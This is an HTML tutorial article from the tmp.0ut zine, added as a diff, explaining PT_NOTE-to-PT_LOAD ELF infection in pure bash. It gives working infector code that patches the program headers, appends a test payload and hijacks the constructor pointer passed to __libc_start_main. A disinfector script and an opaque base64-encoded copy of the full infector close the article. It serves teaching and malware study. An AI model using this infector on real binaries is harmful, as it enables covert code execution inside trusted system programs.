@@ -1,0 +1,432 @@
+<html>
+<head>
+<title>Bashing ELFs Like a Caveman</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                                                                           ┌───────────────────────┐
+                                                                           ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                                           │ █   █ █ █ █   █       │
+                                                                           │ █   █ █ █ █▀▀▀▀       │
+                                                                           │ █   █   █ █     ▄     │
+                                                                           │                 ▄▄▄▄▄ │
+                                                                           │                 █   █ │
+                                                                           │                 █   █ │
+                                                                           │                 █▄▄▄█ │
+                                                                           │                 ▄   ▄ │
+                                                                           │                 █   █ │
+                                                                           │                 █   █ │
+                                                                           │                 █▄▄▄█ │
+                                                                           │                 ▄▄▄▄▄ │
+                                                                           │                   █   │
+Bashing ELFs Like a Caveman                                                │                   █   │
+~ RiS                                                                      └───────────────────█ ──┘
+
+Hey hey ELF fiends, Caveman RiS here, bringing you a quick note on how to bash those ELFs in to 
+submission in restricted environments without compilers or easy to use file transfer protocols. 
+
+Readers may remember an ELF infection technique discussed in the first release of tmp.0ut called 
+PT_NOTE infection. PT_NOTE infection takes advantage of a behavior of modern compilers which add 
+segments to ELF binaries that contain auxillary information in various <x>.note</x> sections. The Ubuntu
+20.04 man page for ELF includes a description of a few <x>.note</x> sections which are now part of a 
+standard ELF object:
+
+  .note    This section holds various notes.  This section is of type SHT_NOTE.  No attribute
+           types are used.
+
+  .note.ABI-tag
+            This section is used to declare the expected run-time ABI of the  ELF  image.   It
+            may  include the operating system name and its run-time versions.  This section is
+            of type SHT_NOTE.  The only attribute used is SHF_ALLOC.
+
+  .note.gnu.build-id
+            This section is used to hold an ID that uniquely identifies the  contents  of  the
+            ELF  image.   Different  files with the same build ID should contain the same exe‐
+            cutable content.  See the --build-id option to the GNU linker (ld  (1))  for  more
+            details.  This section is of type SHT_NOTE.  The only attribute used is SHF_ALLOC.
+
+  .note.GNU-stack
+            This  section  is used in Linux object files for declaring stack attributes.  This
+            section is of type SHT_PROGBITS.  The only attribute used is SHF_EXECINSTR.   This
+            indicates to the GNU linker that the object file requires an executable stack.
+
+A quick check shows that modern compilers such as GCC 10 and LLVM 12 both emit some of these 
+sections by default:
+
+  $ cat hello.c
+  #include &lt;stdio.h&gt;
+  int main() { printf("hello tmp.0ut\n"); }
+  $ gcc -v 2&gt;&1 | tail -1
+  gcc version 10.3.0 (Ubuntu 10.3.0-1ubuntu1~20.04)
+  $ gcc -o hello hello.c
+  $ objdump -h hello | grep -i note
+    1 .note.gnu.property 00000020  0000000000000338  0000000000000338  00000338  2**3
+    2 .note.gnu.build-id 00000024  0000000000000358  0000000000000358  00000358  2**2
+    3 .note.ABI-tag 00000020  000000000000037c  000000000000037c  0000037c  2**2
+  
+  $ clang -v 2&gt;&1 | head -1
+  Ubuntu clang version 12.0.0-3ubuntu1~20.04.4
+  $ clang -o hello hello.c
+  $ objdump -h hello | grep -i note
+    1 .note.gnu.build-id 00000024  00000000004002c4  00000000004002c4  000002c4  2**2
+    2 .note.ABI-tag 00000020  00000000004002e8  00000000004002e8  000002e8  2**2
+
+Sticking with GCC compiler output, next we can see these sections are located in memory segments 
+defined as PT_NOTE in the ELF program header table:
+
+  $ objdump -p hello | grep -i note
+      NOTE off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
+      NOTE off    0x0000000000000358 vaddr 0x0000000000000358 paddr 0x0000000000000358 align 2**2
+
+While these segments and sections are added by default in modern compilers, their presence is not 
+required by the linker or loader. This provides a convienient opportunity for an attacker to modify
+the existing ELF structure and hijack a PT_NOTE entry. The first objective is to convert an existing
+PT_NOTE program header table entry into a PT_LOAD and modify the page permissions to be readable and
+executable so the segment is suitable for containing the attack payload at runtime.
+
+As the title of this article alludes to, we will be creating our ELF infector using <x>bash</x> and 
+standard tools from <x>coreutils</x> and <x>binutils</x> with an assist from <x>xxd</x>. I will explain how the
+code works in chunks and then include the complete code compressed and base64 encoded at the end. 
+
+So first let's define a few things, we need an ELF target to begin with. We will take an <x>-f</x>
+parameter so the user can specify a file path, or if none is specified, select a random file 
+from <x>/usr/bin</x> until we find a 64-bit ELF. I will be using <x>/bin/ls</x> for our walkthrough:
+
+  #!/bin/bash
+  
+  while getopts ":f:" arg; do
+      case $arg in
+          f)
+              TARGET_PATH="${OPTARG}"
+      esac
+  done
+  
+  # select a random file from /usr/bin and make sure it's an ELF
+  while [ "$TARGET_PATH" == "" ]
+  do
+      F=`ls /usr/bin | sort -R | head -1`
+      F="/usr/bin/$F"
+      SIG=`file $F | cut -d ' ' -f 2`
+      [ "$SIG" == "ELF" ] && TARGET_PATH="$F"
+  done
+  
+  # copy target for modification
+  TARGET_NAME=$(basename $TARGET_PATH)
+  ELF="/tmp/.${TARGET_NAME}.infected"
+  cp "$TARGET_PATH" "$ELF"
+
+For brevity, this implementation will only support 64-bit targets but it would be possible for our 
+code to support both 32-bit and 64-bit targets so lets define some type sizes: 
+
+  # determine if our ELF is 32 or 64 bit
+  BITS=`file $file_arg | cut -d ' ' -f 3 | cut -d '-' -f 1`
+  ptr_size=$(($BITS / 8))
+  word_size=4
+  half_size=2
+
+We will need a function to allow us to read bytes out of our target ELF. This function takes 
+<x>offset</x>, <x>length</x>, and an <x>output</x> variable as arguments. We use the <x>od</x> tool to read the values
+in as ASCII unsigned integer representation of the bytes because bash is heavily resistant to 
+reading raw NULL bytes into a variable using something like <x>dd</x>:
+
+  # read_bytes offset len out_variable
+  function read_bytes()
+  {
+      local _varname=$3
+      VAL="$(A=`od -An -j $1 -N $2 -t u$2 "$ELF"` ; echo $A)"
+      eval $_varname=$(($VAL))
+  }
+
+We also need a function to write bytes which will take an <x>offset</x>, <x>length</x>, and <x>value</x>. To do 
+binary editing in bash, we will convert any numeric value to hex via <x>printf</x>, reverse the order 
+of the bytes to little endian, and use <x>xxd</x> to convert to the actual bytes representing the ASCII
+hex value. From there we can use <x>dd</x> to perform the write at the appropriate offset.
+
+  # write_bytes offset len value
+  function write_bytes()
+  {
+      printf "%0$(($2*2))x" $3 | tac -rs .. | xxd -p -r | dd bs=1 seek=$1 count=$2 conv=notrunc of=$ELF 2&gt;/dev/null
+  }
+
+We are almost ready to begin bashing the ELF but first we need to figure out which PT_NOTE entry we
+are going to target. We can do this with raw ELF parsing, but as you are about to see, we want to do
+as little of that as possible so we will use helper tools in this example implementation. I will 
+stick to using <x>objdump</x> since it is part of the binutils package installed on most Linux 
+distributions and we just need to resolve the index of the segment definition in the program 
+header table. 
+
+For <x>/bin/ls</x> the full table looks like this: 
+
+$ objdump -p /bin/ls
+
+/bin/ls:     file format elf64-x86-64
+
+  Program Header:
+      PHDR off    0x0000000000000040 vaddr 0x0000000000000040 paddr 0x0000000000000040 align 2**3
+           filesz 0x00000000000002d8 memsz 0x00000000000002d8 flags r--
+    INTERP off    0x0000000000000318 vaddr 0x0000000000000318 paddr 0x0000000000000318 align 2**0
+           filesz 0x000000000000001c memsz 0x000000000000001c flags r--
+      LOAD off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**12
+           filesz 0x00000000000036a8 memsz 0x00000000000036a8 flags r--
+      LOAD off    0x0000000000004000 vaddr 0x0000000000004000 paddr 0x0000000000004000 align 2**12
+           filesz 0x0000000000013581 memsz 0x0000000000013581 flags r-x
+      LOAD off    0x0000000000018000 vaddr 0x0000000000018000 paddr 0x0000000000018000 align 2**12
+           filesz 0x0000000000008b50 memsz 0x0000000000008b50 flags r--
+      LOAD off    0x0000000000021010 vaddr 0x0000000000022010 paddr 0x0000000000022010 align 2**12
+           filesz 0x0000000000001258 memsz 0x0000000000002548 flags rw-
+   DYNAMIC off    0x0000000000021a58 vaddr 0x0000000000022a58 paddr 0x0000000000022a58 align 2**3
+           filesz 0x0000000000000200 memsz 0x0000000000000200 flags rw-
+      NOTE off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
+           filesz 0x0000000000000020 memsz 0x0000000000000020 flags r--
+      NOTE off    0x0000000000000358 vaddr 0x0000000000000358 paddr 0x0000000000000358 align 2**2
+           filesz 0x0000000000000044 memsz 0x0000000000000044 flags r--
+  0x6474e553 off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
+           filesz 0x0000000000000020 memsz 0x0000000000000020 flags r--
+  EH_FRAME off    0x000000000001d24c vaddr 0x000000000001d24c paddr 0x000000000001d24c align 2**2
+           filesz 0x000000000000092c memsz 0x000000000000092c flags r--
+     STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
+           filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw-
+     RELRO off    0x0000000000021010 vaddr 0x0000000000022010 paddr 0x0000000000022010 align 2**0
+           filesz 0x0000000000000ff0 memsz 0x0000000000000ff0 flags r--
+
+So we grep this output for the line number of the last NOTE segment and do the math to resolve the 
+entry index:
+
+  LN=`objdump -p $ELF  | grep -n NOTE | tail -1 | cut -d ':' -f 1`
+  NOTE_PHX_IDX=$((($LN - 5) / 2))
+
+With the setup out of the way, we are ready to begin parsing the ELF header to locate the program 
+header table entry for our targeted PT_NOTE. First we need to find the offset to the beginning of 
+the program header table which is held in <x>Ehdr.p_phoff</x> and also the <x>Ehdr.e_phentsize</x> which 
+defines the size of each entry. These two values will allow us to find the program header table 
+entry that corresponds to the index of the PT_NOTE we selected above.
+
+  EI_NIDENT=16
+  e_phoff_off=$(($EI_NIDENT + (2*$half_size) + $word_size + $ptr_size))
+  e_phentsize_off=$(($e_phoff_off + $ptr_size + $ptr_size + $word_size + $half_size))
+  
+  read_bytes $e_phoff_off $ptr_size e_phoff
+  read_bytes $e_phentsize_off $half_size e_phentsize
+
+From here we can calculate the offsets to the fields of the PT_NOTE entry we are targeting:
+
+  note_off=$(($e_phoff + $NOTE_PHX_IDX * $e_phentsize))
+  note_type_off=$(($note_off))
+  note_flags_off=$(($note_off + $word_size))
+  note_offset_off=$(($note_flags_off + $word_size))
+  note_vaddr_off=$(($note_offset_off + $ptr_size))
+  note_paddr_off=$(($note_vaddr_off + $ptr_size))
+  note_filesz_off=$(($note_paddr_off + $ptr_size))
+  note_memsz_off=$(($note_filesz_off + $ptr_size))
+  note_align_off=$(($note_memsz_off + $ptr_size))
+
+Time for some ELF bashing! Let's convert the PT_NOTE into a PT_LOAD with read and execute 
+permissions:
+
+  pt_load_type='\x01\x00\x00\x00'
+  pt_load_flags='\x05\x00\x00\x00'
+  printf $pt_load_type | dd bs=1 seek=$note_type_off count=$half_size conv=notrunc of=$ELF 2&gt;/dev/null
+  printf $pt_load_flags | dd bs=1 seek=$note_flags_off count=$half_size conv=notrunc of=$ELF 2&gt;/dev/null
+
+Next we can redefine the contents of the segment to point to our payload. We will append our payload
+to the end of the ELF so we want to update the offset and size stored in <x>Phdr.p_offset</x> and 
+<x>Phdr.p_filesz</x> accordingly. We also need to make the virtual address page aligned and the segment
+size large enough to hold the payload by adjusting <x>Phdr.p_vaddr</x> and <x>Phdr.p_memsz</x>.
+
+  file_size=$((`wc -c "$ELF" | cut -d ' ' -f 1`))
+  file_size_PAGES=$(($file_size/4096 + 1))
+  file_size_ALIGNED=$(($file_size_PAGES * 4096))
+  
+  segment_size=$((0x10000))
+  segment_base=$((0x70000000))
+  
+  write_bytes $note_offset_off $ptr_size $file_size_ALIGNED
+  write_bytes $note_vaddr_off $ptr_size $segment_base
+  write_bytes $note_paddr_off $ptr_size $file_size_ALIGNED
+  write_bytes $note_filesz_off $ptr_size $segment_size
+  write_bytes $note_memsz_off $ptr_size $segment_size
+  write_bytes $note_align_off $ptr_size $((0x1000))
+  
+Our header modification is complete. The new loadable segment will be mapped at the selected 
+<x>segment_base</x> and reserve <x>segment_size</x> bytes to hold our payload. We can see the updated 
+program header table now shows our modification from PT_NOTE to PT_LOAD:
+
+  $ objdump -p /tmp/.ls.infected
+  
+  /tmp/.ls.infected:     file format elf64-x86-64
+  
+  Program Header:
+      PHDR off    0x0000000000000040 vaddr 0x0000000000000040 paddr 0x0000000000000040 align 2**3
+           filesz 0x00000000000002d8 memsz 0x00000000000002d8 flags r--
+    INTERP off    0x0000000000000318 vaddr 0x0000000000000318 paddr 0x0000000000000318 align 2**0
+           filesz 0x000000000000001c memsz 0x000000000000001c flags r--
+      LOAD off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**12
+           filesz 0x00000000000036a8 memsz 0x00000000000036a8 flags r--
+      LOAD off    0x0000000000004000 vaddr 0x0000000000004000 paddr 0x0000000000004000 align 2**12
+           filesz 0x0000000000013581 memsz 0x0000000000013581 flags r-x
+      LOAD off    0x0000000000018000 vaddr 0x0000000000018000 paddr 0x0000000000018000 align 2**12
+           filesz 0x0000000000008b50 memsz 0x0000000000008b50 flags r--
+      LOAD off    0x0000000000021010 vaddr 0x0000000000022010 paddr 0x0000000000022010 align 2**12
+           filesz 0x0000000000001258 memsz 0x0000000000002548 flags rw-
+   DYNAMIC off    0x0000000000021a58 vaddr 0x0000000000022a58 paddr 0x0000000000022a58 align 2**3
+           filesz 0x0000000000000200 memsz 0x0000000000000200 flags rw-
+      NOTE off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
+           filesz 0x0000000000000020 memsz 0x0000000000000020 flags r--
+      LOAD off    0x0000000000023000 vaddr 0x0000000070000000 paddr 0x0000000000023000 align 2**12
+           filesz 0x0000000000010000 memsz 0x0000000000010000 flags r-x
+  0x6474e553 off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
+           filesz 0x0000000000000020 memsz 0x0000000000000020 flags r--
+  EH_FRAME off    0x000000000001d24c vaddr 0x000000000001d24c paddr 0x000000000001d24c align 2**2
+           filesz 0x000000000000092c memsz 0x000000000000092c flags r--
+     STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
+           filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw-
+     RELRO off    0x0000000000021010 vaddr 0x0000000000022010 paddr 0x0000000000022010 align 2**0
+           filesz 0x0000000000000ff0 memsz 0x0000000000000ff0 flags r--
+
+Now we are ready for payload insertion. In the code below, we have padded the end of the file to the
+nearest page boundary and placed a temporary payload of an <x>int3</x> [<x>0xCC</x>] breakpoint opcode and a 
+<x>ret</x> [<x>0xC3</x>] opcode after the padding. This payload should be replaced with something more useful,
+but for now it will simply trap in an attached debugger to verify the functioning of the infector 
+and let the user return and continue executing the program.
+
+  # pad ELF out to page boundary for segment alignment
+  PAD=$(($file_size_ALIGNED-$file_size))
+  dd if=/dev/zero bs=1 count=$PAD 2&gt;/dev/null &gt;&gt; $ELF
+  
+  # Add test payload: int3; ret;
+  PAYLOAD="\xCC\xC3"
+  echo -ne $PAYLOAD &gt;&gt; $ELF
+
+Finally we need an execution control vector. We could have stored the entry point offset in the ELF
+header and used that to hijack control of execution but that's messy if we want to let the original
+program run, so lets hook the constructor instead. 
+
+In a typical ELF, the program entry point calls <x>_start</x> which will prepare some registers and call
+<x>__libc_start_main</x>, passing pointers to a constructor (<x>init</x>), destructor (<x>fini</x>), and <x>main</x> 
+function as we can see in the <x>__libc_start_main</x> function prototype:
+
+  int __libc_start_main(
+      int *(main) (int, char * *, char * *), 
+      int argc, 
+      char * * ubp_av, 
+      void (*init) (void), 
+      void (*fini) (void), 
+      void (*rtld_fini) (void), 
+      void (* stack_end)
+  );
+
+In the disassembly, the constructor address is passed as a <x>RIP</x> relative offset in the <x>RCX</x> 
+register. That's enough information for us to disassemble the program looking for the call to 
+<x>__libc_start_main</x> and capture the arguments being passed to it with objdump:
+
+  $ objdump --disassemble /bin/ls | grep  -B3 __libc_start_main
+      67e3:       4c 8d 05 66 0d 01 00    lea    0x10d66(%rip),%r8   # 17550 &lt;_obstack_memory_used@@Base+0x8f0&gt;
+      67ea:       48 8d 0d ef 0c 01 00    lea    0x10cef(%rip),%rcx  # 174e0 &lt;_obstack_memory_used@@Base+0x880&gt;
+      67f1:       48 8d 3d f8 e5 ff ff    lea    -0x1a08(%rip),%rdi  # 4df0 &lt;__sprintf_chk@plt+0x60&gt;
+      67f8:       ff 15 d2 c7 01 00       callq  *0x1c7d2(%rip)      # 22fd0 &lt;__libc_start_main@GLIBC_2.2.5&gt;
+
+For our infector, this means we will grep and dump a few instructions before the call to 
+<x>__libc_start_main</x> looking for the load into <x>RCX</x> and replace the offset so it points to 
+the virtual address mapping holding our payload.
+
+  # hook ctor_offset
+  lea_offset="0x`objdump --disassemble $ELF | grep  -B3 __libc_start_main | grep lea | grep rcx | cut -d ':' -f 1 | tr -d ' '`"
+  ctor_addr_offset=$(($lea_offset + 3))
+  ctor_rel_addr=$(($segment_base - $ctor_addr_offset - 4))
+  
+  write_bytes $ctor_addr_offset 4 $ctor_rel_addr
+
+Now our infection is complete, we have bashed that ELF right into submission!
+
+It would be unwise to unleash such powerful ELF bashing abilities without also releasing a 
+disinfector to help our ELF friends recover. Here is an additional bash script to disinfect our
+<x>.ctors</x> hook:
+
+  #!/bin/bash
+  
+  while getopts ":f:" arg; do
+      case $arg in
+          f)
+              file_arg="${OPTARG}"
+      esac
+  done
+  
+  [ "$file_arg" == "" ] && echo "$0 -f &lt;file&gt;" && exit
+  
+  # copy target elf for modification
+  BIN=$(basename $file_arg)
+  ELF="/tmp/${BIN}.disinfected"
+  cp "$file_arg" "$ELF"
+  echo Disinfecting $ELF
+  
+  OFFSET="0x`objdump --disassemble "$ELF" | grep  -B3 __libc_start_main | grep lea | grep r8 | cut -d ':' -f 1 | tr -d ' '`"
+  dtor_offset=$(($OFFSET))
+  
+  OFFSET="0x`objdump --disassemble "$ELF" | grep  -B3 __libc_start_main | grep lea | grep rcx | cut -d ':' -f 1 | tr -d ' '`"
+  ctor_offset=$(($OFFSET))
+  
+  CLEAR_RCX='\x48\xC7\xC1\x00\x00\x00\x00'
+  CLEAR_R8='\x49\xC7\xC0\x00\x00\x00\x00'
+  
+  echo BEFORE disinfection:
+  objdump --disassemble $ELF | grep -B3 __libc_start_main
+  
+  # disable CTOR
+  printf $CLEAR_RCX | dd bs=1 seek=$ctor_offset count=7 conv=notrunc of=$ELF 2&gt;/dev/null
+  
+  # disable DTOR
+  printf $CLEAR_R8 | dd bs=1 seek=$dtor_offset count=7 conv=notrunc of=$ELF 2&gt;/dev/null
+  
+  echo ""
+  echo AFTER disinfection:
+  objdump --disassemble $ELF | grep -B3 __libc_start_main
+
+An example output of the disinfector script looks like this: 
+
+  $ ./elf_bash.sh -f /bin/ls
+  Infecting /tmp/.ls.infected
+  $ ./elf_bash_disinfect.sh -f /tmp/.ls.infected
+  Disinfecting /tmp/.ls.infected.disinfected
+  BEFORE disinfection:
+      67e3:       4c 8d 05 66 0d 01 00    lea    0x10d66(%rip),%r8     # 17550 &lt;_obstack_memory_used@@Base+0x8f0&gt;
+      67ea:       48 8d 0d 0f 98 ff 6f    lea    0x6fff980f(%rip),%rcx # 70000000 &lt;program_name@@Base+0x6ffdbc00&gt;
+      67f1:       48 8d 3d f8 e5 ff ff    lea    -0x1a08(%rip),%rdi    # 4df0 &lt;__sprintf_chk@plt+0x60&gt;
+      67f8:       ff 15 d2 c7 01 00       callq  *0x1c7d2(%rip)        # 22fd0 &lt;__libc_start_main@GLIBC_2.2.5&gt;
+  
+  AFTER disinfection:
+      67e3:       49 c7 c0 00 00 00 00    mov    $0x0,%r8
+      67ea:       48 c7 c1 00 00 00 00    mov    $0x0,%rcx
+      67f1:       48 8d 3d f8 e5 ff ff    lea    -0x1a08(%rip),%rdi    # 4df0 &lt;__sprintf_chk@plt+0x60&gt;
+      67f8:       ff 15 d2 c7 01 00       callq  *0x1c7d2(%rip)        # 22fd0 &lt;__libc_start_main@GLIBC_2.2.5&gt;
+
+Thanks for following along, hope you enjoyed our little adventure in bashing ELFs like a caveman. 
+Greetz to the tmp.0ut crew and Undercurrents BBS callers.
+
+-RiS
+
+
+$ cat elf_bash.sh | gzip | base64
+H4sIAAAAAAAAA5VWa2/bNhT9bP6KO0Xr7AyKn822FArgInZmwHCCxhg6bIMsS5StVhYFik6cZPnv
+u6RelGVsnQulEnnuuYfn8nX2XXcdxt21m24JedqGEYUNFSwRKRhXwZUBLt98AJ+RluemFEz8hDAm
+rVbQwT+tAAMcbLMN8/Xufjn+dPtmkBZNXY/4LKYF5R9gmAXUANsGw4C/EAGkNbVXUQrdfcqlEPgb
+UsYFWJ/wbUtdH6z+SoKMAtE1p5jhYXZrryQjmFNEensM8eEH/GcFMMAImRFBWbLJfIr54N070PQi
+TSbxDDyWPIPAZiqARgEEjMOO+WEQeq4IWUw+zha22UaTaOzuMGdB0yFIjdrELulemK8Ie7sI44B6
+gvoG8ZLasA1T6iDU2zKYKVAYb0A2Sg0+FZTvwphCGADbc8B2CFMYDgDVXI5gHQrUsXwoxl0QN4Y/
+1Fos1YIWJoI7afhCcRhtU9JAF37udMgT437WMSJbNwqy94FUxNF+Z/0saAosCFL0JqIxShPOo8tD
+dx1REuxjTxqkYdsd8koAfxHz3AgkVnpmm0PV+tt4jt63x/aKYW3HMVhfwOyDtQBzAJaAPf6XGbWC
+D6C8MscdQ8XSRyQ0K0YcCdLhIN6k3CceCtrUizF7TaiGUkpbCQ9jEYDxfU/yDc4Hnc7BAFOaKFwP
+LJ7CxQV+HA6oN8FvfPd9WKd2H1JKv9qo3mP7WNio3GPxox0zwTEdirDlQGBw3fXpYzfeR5FUOl/g
+2Ndf/P0ukYQKgpwbTvE7hsXdcqJyhxHOfa2UV0UpJcK5//WzM7v5LE1om/MFWPC+gyVF9YRMZs5i
+djNZLO3+JaFOskU7HHyUY2Un/AjtwblZFr2DDWY5HeRHMWeQU7LQWMivkklj1tHH7zXKKhvq1CZY
+jawKz1sbSE2KxglaFyFYhoZWKUG3D85rfChKRYnnpAoteIrOIHI3aaO3NtICmk3DOrYMPxnx6Po+
+b5DnJEc1Ub1JM6DkOIWXu0b6Ug9I/i1gR3fH+IrjVIAbhZu4HlByHOFxV3IihqWVhtvGn4deH59e
+8RhlvzJNAd4fAbLVa+pEjQVaq2mxWKtZ85+L9jiJUnM6S1Xd/5+GqB292KRXT7j5ePle2Njj+yu0
+r8Q79+PbyYPyu2zrjnq/XKLf/RpwPJ/dLiY3dWgWjmtBhsiynAFOCXUA4W4PguHnhsIaR+S7/Fkd
+jynd7HDVgKq2fCP342PaPJlVNSE5mhYGthr1C+UsczA3Cyl0R+D6Oj8e82ylOb1Dv4c/pCt65Nmc
+9fzUy35yIPqZ0FhN1TbT1HwislpWWqCe/kRMcirmW5JpS+xENrXBNYOqZfbtMeVq1WMKg6WF9+Pf
+53dYWlx8nofPML/BWHhTMfPOqlBnsGXsK3iC8dxqcjedPkyWttE7VMee5Yepm6Z0t5Y3GTnR8gMQ
+rI9DcJwoXHtOijcy4excdStUvRF1i1fuHZpnozw3eb5KVnj/kiqKCqAUNT0zObgwhjg6heA0UijV
+rRcUD1XzmAPbRvLapBvZwIzytoKZkH8A0HGtSmcLAAA=
+</pre></body></html>
